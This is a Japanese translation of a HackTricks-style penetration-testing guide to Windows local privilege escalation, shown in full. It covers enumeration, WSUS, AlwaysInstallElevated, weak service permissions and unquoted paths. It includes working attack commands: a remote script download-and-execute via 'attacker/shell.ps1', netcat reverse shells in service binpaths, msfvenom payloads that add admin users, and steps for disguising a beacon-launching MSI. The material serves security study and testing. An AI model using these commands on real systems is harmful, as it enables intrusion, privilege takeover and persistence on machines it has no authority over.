# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクトルを調べる最適なツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基本事項

### アクセストークン

**Windows のアクセストークンが何か分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs に関する詳細は次のページを参照してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 整合性レベル

**Windows の整合性レベルが何か分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙を妨げる**、実行ファイルの実行を阻止する、あるいは**あなたの活動を検知する**などのさまざまな機能があります。権限昇格の列挙を開始する前に、以下の**ページ**を**読み**、これらの**防御****メカニズム**をすべて**列挙**してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### 管理者保護 / UIAccess サイレント昇格

UIAccess プロセスは `RAiLaunchAdminProcess` を通じて起動されると、AppInfo secure-path checks がバイパスされた場合にプロンプトなしで High IL に到達するよう悪用される可能性があります。専用の UIAccess/Admin Protection バイパスワークフローはここを参照してください：

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認すること）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は Microsoft のセキュリティ脆弱性に関する詳細情報の検索に便利です。 このデータベースには4,700件以上の脆弱性が登録されており、Windows環境が示す **膨大な攻撃対象領域** を表しています。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**ローカル（システム情報あり）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github の exploits リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

認証情報や有益な情報が環境変数に保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

これを有効にする方法は次のページで確認できます: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShellのパイプライン実行の詳細が記録され、実行されたコマンド、コマンド呼び出し、スクリプトの一部が含まれます。ただし、実行の完全な詳細や出力結果は必ずしも記録されないことがあります。

有効にするには、ドキュメントの "Transcript files" セクションの指示に従い、**"Module Logging"** を **"Powershell Transcription"** ではなく選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの最後の15件のイベントを表示するには、次のコマンドを実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する全ての活動と実行内容が完全に記録され、各コードブロックが実行時に文書化されます。このプロセスはフォレンジックや悪意ある挙動の解析に有用な包括的な監査証跡を保存します。実行時の全ての活動を記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Blockのログイベントは、Windows Event Viewerの次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
最新の20件のイベントを表示するには、次のコマンドを使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネットの設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを侵害することができます。

まず、ネットワークが非SSLの WSUS 更新を使用しているかどうかを確認するために、cmdで次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellで次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信が返ってきた場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` の場合。

その場合、**悪用可能です。** 最後のレジストリが `0` の場合、WSUS エントリは無視されます。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit) や [pyWSUS](https://github.com/GoSecure/pywsus) のようなツールを使用できます。これらは、非SSL WSUS トラフィックに「偽」の更新を注入するための MiTM 型のエクスプロイトスクリプトです。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本的に、この脆弱性が利用する欠陥は次の通りです:

> ローカルユーザーのプロキシを変更する権限があり、Windows Update が Internet Explorer の設定で構成されたプロキシを使用する場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自身のトラフィックを傍受し、当該端末で権限昇格したユーザーとしてコードを実行することが可能になります。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS のホスト名に対して自己署名証明書を生成し、それを現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを傍受できるようになります。WSUS は証明書に対して HSTS-like なメカニズムを使った trust-on-first-use 型の検証を実装していません。提示された証明書がユーザーにより信頼され、正しいホスト名を持っていれば、サービスはそれを受け入れます。

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開され次第）を使って悪用できます。

## サードパーティの自動アップデータと Agent IPC (local privesc)

多くのエンタープライズエージェントは localhost の IPC インターフェースと特権付きの更新チャネルを公開しています。エンロールメントが攻撃者のサーバーに強制され、アップデータが不正なルート CA や弱い署名検証を信頼する場合、ローカルユーザーは SYSTEM サービスがインストールする悪意のある MSI を配布できます。一般化された手法（Netskope の stAgentSvc チェーンに基づく – CVE-2025-0309）は以下を参照:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` は localhost 上で **TCP/9401** のサービスを公開しており、攻撃者制御のメッセージを処理して **NT AUTHORITY\SYSTEM** として任意のコマンドを実行可能にします。

- **Recon**: リスナーとバージョンを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 必要な Veeam DLL と共に `VeeamHax.exe` のような PoC を同じディレクトリに置き、ローカルソケット経由で SYSTEM ペイロードをトリガーします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。

## KrbRelayUp

特定の条件下の Windows **domain** 環境に、**local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる自己権限を持っていること、およびドメイン内でコンピュータを作成できる権限をユーザーが有していることが含まれます。これらの**requirements**が**default settings**で満たされている点に注意してください。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

攻撃のフローの詳細については次を参照してください: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

これら2つのレジストリが**enabled**（値が **0x1**）の場合、任意の権限のユーザーが NT AUTHORITY\\**SYSTEM** として `*.msi` ファイルを**install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreterセッションがある場合、このテクニックはモジュール **`exploit/windows/local/always_install_elevated`** を使って自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用して、現在のディレクトリに権限昇格用の Windows MSI バイナリを作成します。このスクリプトはユーザー/グループの追加を促すプリコンパイル済みの MSI インストーラを出力します（そのため GIU アクセスが必要です）:
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限昇格できます。

### MSI Wrapper

このチュートリアルを読んで、MSI Wrapper を作成する方法を学んでください。注意: **コマンドライン**を**実行**したい**だけ**であれば、**.bat** ファイルをラップできます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit を使用して、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を生成します。
- **Visual Studio** を開き、**Create a new project** を選択し、検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように設定し、ロケーションには **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- **Next** をクリックし続け、4つ中のステップ3（含めるファイルを選択）まで進めます。**Add** をクリックして先ほど生成した Beacon ペイロードを選択し、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** の **TargetPlatform** を **x86** から **x64** に変更します。
- インストールされたアプリをより正当性のある見た目にするために、**Author** や **Manufacturer** といった他のプロパティも変更できます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックして **beacon.exe** を選択し、**OK** をクリックします。これにより、インストーラ実行時に beacon ペイロードがすぐに実行されるようになります。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**ビルド**します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの **インストール** をバックグラウンドで実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出ツール

### 監査設定

これらの設定は何が**ログに記録されるか**を決定するため、注意が必要です。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送られているかを把握しておくと有用です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** はドメインに参加しているコンピュータ上の **ローカル管理者パスワードの管理** を目的としており、各パスワードが **一意でランダム化され、定期的に更新される** ようにします。これらのパスワードは Active Directory に安全に保存され、ACLs を通じて十分な権限が付与されたユーザーのみが閲覧できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによる**メモリを読み取る**またはコード注入の試行を**ブロック**して、システムをさらに保護する機能を導入しました。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。これはデバイスに保存された認証情報を pass-the-hash のような脅威から保護することを目的としています。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** は **Local Security Authority (LSA)** によって認証され、オペレーティングシステムのコンポーネントで使用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、そのユーザーの domain credentials が通常確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループの中に、興味深い権限を持つものがないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**ある特権グループに属している場合、権限を昇格できる可能性があります**。特権グループとそれを悪用して権限を昇格する方法については、こちらを参照してください：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

このページで**token**が何かを**詳しく学んでください**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページで、**興味深い token**とそれらを悪用する方法について学んでください：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオンユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを一覧表示するときに、**プロセスのコマンドライン内にパスワードがないか確認する**。\
実行中のbinaryを**上書きできるか**、またはbinaryフォルダに書き込み権限があり、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できるか確認する:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers** が実行されていないか確認してください。権限昇格に悪用できる可能性があります](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリ上のパスワード抽出

sysinternalsの**procdump**を使って、実行中のプロセスのメモリダンプを作成できます。FTPのようなサービスでは、**credentials in clear text in memory**をメモリ上に保持していることがあります。メモリをダンプして、その資格情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全な GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーに CMD を起動させたり、ディレクトリを参照させたりする可能性があります。**

例: "Windows Help and Support" (Windows + F1) を開き、"command prompt" を検索して "Click to open Command Prompt" をクリック

## サービス

Service Triggers により、特定の条件 (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.) が発生したときに Windows がサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発火させることで特権サービスを起動できることが多いです。列挙と起動の手法についてはこちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには、**sc** を使用できます
```bash
sc qc <service_name>
```
各サービスの必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"が任意のサービスを変更できるか確認することをお勧めします:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生している場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

有効にするには、以下を使用します
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存している点に注意（XP SP1 向け）**

**別の回避策** この問題に対する別の対処法は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を持っている場合、そのサービスの実行可能バイナリを変更することが可能です。変更および実行するには **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限昇格は以下の権限によって可能です:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリの再設定を許可する。
- **WRITE_DAC**: 権限設定（ACL）の再設定を可能にし、サービス構成を変更できるようになる。
- **WRITE_OWNER**: 所有権の取得や権限設定の再構成を許可する。
- **GENERIC_WRITE**: サービス構成を変更する権限を含む。
- **GENERIC_ALL**: 同様にサービス構成を変更する権限を含む。

この脆弱性の検出と悪用には _exploit/windows/local/service_permissions_ を使用できる。

### Services binaries weak permissions

**サービスによって実行されるバイナリを変更できるか確認する** またはバイナリが配置されているフォルダに**書き込み権限があるか確認する** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行されるすべてのバイナリは **wmic** (not in system32) を使って取得でき、**icacls** で権限を確認できる:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** および **icacls** を使用することもできます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるか確認する必要があります。\
次の方法でサービス**レジストリ**に対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
サービスが実行するバイナリを変更できるかどうかを確認するため、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているかどうかを確認する必要があります。もしそうであれば、サービスによって実行されるバイナリを変更できます。

実行されるバイナリのパスを変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race による任意の HKLM value write (ATConfig)

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成し、後で **SYSTEM** プロセスがそれを HKLM のセッションキーにコピーします。レジストリの **symbolic link race** により、その特権書き込みを **any HKLM path** にリダイレクトでき、任意の HKLM **value write** プリミティブを得られます。

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry の AppendData/AddSubdirectory 権限

もしレジストリに対してこの権限を持っている場合、これは**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分です:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースより前の各候補を順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次の順で実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないすべてのサービスパスを列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**検出および悪用できます** この脆弱性は metasploit を使用して: `exploit/windows/local/trusted\_service\_path` metasploit を使用して手動でサービスバイナリを作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsではサービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能はバイナリを指すように設定できます。もしこのバイナリが置き換え可能であれば、権限昇格が可能になるかもしれません。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

確認する: **バイナリの権限**（上書きできれば権限昇格できるかもしれない）および**フォルダ**の権限（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読み取るために設定ファイルを変更できるか、または Administrator アカウントで実行されるバイナリ（schedtasks）を変更できるか確認する。

システム内の脆弱なフォルダー/ファイルの権限を見つける方法の一つは次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
